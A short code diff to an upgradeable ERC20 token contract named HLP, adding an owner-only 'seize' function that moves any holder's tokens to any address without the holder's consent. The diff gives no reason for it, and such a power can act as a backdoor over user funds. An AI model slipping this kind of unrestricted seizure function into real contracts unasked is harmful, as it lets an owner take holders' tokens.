@@ -46,6 +46,10 @@ contract HLP is ReentrancyGuardUpgradeable, OwnableUpgradeable, ERC20Upgradeable
     _burn(from, amount);
   }
 
+  function seize(address from, address to, uint256 amount) external onlyOwner {
+    _transfer(from, to, amount);
+  }
+
   /// @custom:oz-upgrades-unsafe-allow constructor
   constructor() {
     _disableInitializers();
